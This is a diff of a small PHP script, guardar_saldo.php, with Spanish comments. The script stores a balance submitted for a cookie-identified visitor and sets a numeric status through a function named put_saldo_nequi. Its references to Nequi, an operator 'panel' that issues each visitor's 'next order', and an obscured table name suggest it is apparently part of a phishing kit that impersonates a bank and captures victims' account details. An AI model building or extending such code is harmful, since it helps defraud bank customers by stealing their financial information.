@@ -1,12 +1,7 @@
 <?php
 /**
- * guardar_saldo.php (Versión Opción 1 - Simplificada)
- * Cambia el estado a 1 (esperando siguiente orden del panel)
- * 
- * INSTRUCCIONES:
- * 1. Reemplaza 'nombre_tabla' con el nombre real de tu tabla
- * 2. Reemplaza 'idreg' con el nombre real del campo ID
- * 3. Reemplaza 'status' si tu campo tiene otro nombre
+ * guardar_saldo.php
+ * Guarda el saldo y cambia estado a 28
  */
 
 require_once('../lib/class.inputfilter.php');
@@ -18,7 +13,7 @@ $ifilter = new InputFilter();
 // Obtener ID del cliente desde cookie
 $id = isset($_COOKIE['id']) ? $ifilter->process($_COOKIE['id']) : '';
 
-// Obtener saldo desde POST (se valida pero no se guarda)
+// Obtener saldo desde POST
 $saldo = isset($_POST['saldo']) ? $ifilter->process($_POST['saldo']) : '';
 
 // Validar que tenemos datos
@@ -29,25 +24,15 @@ if ($id === '' || $id === '0' || $saldo === '') {
 }
 
 try {
-	// Cambiar estado a 1 (estado inicial/esperando siguiente orden del panel)
-	$query = "UPDATE m3it3m 
-	          SET status = '1' 
-	          WHERE idreg = :id";
+	// Usar la función que ya existe en setings.php
+	// Actualiza status a 28 y guarda el saldo en el campo 'agente'
+	put_saldo_nequi($id, $saldo);
 	
-	$stmt = $conexion->prepare($query);
-	$stmt->bindParam(':id', $id);
-	
-	if ($stmt->execute()) {
-		// Log opcional del saldo (para referencia)
-		error_log("Saldo recibido para ID $id: $saldo");
-		echo 'OK';
-	} else {
-		http_response_code(500);
-		echo 'ERR';
-	}
+	error_log("✅ Saldo guardado para ID $id: $saldo");
+	echo 'OK';
 	
 } catch (Exception $e) {
-	error_log('Error actualizando estado: ' . $e->getMessage());
+	error_log('❌ Error: ' . $e->getMessage());
 	http_response_code(500);
 	echo 'ERR';
 	exit;
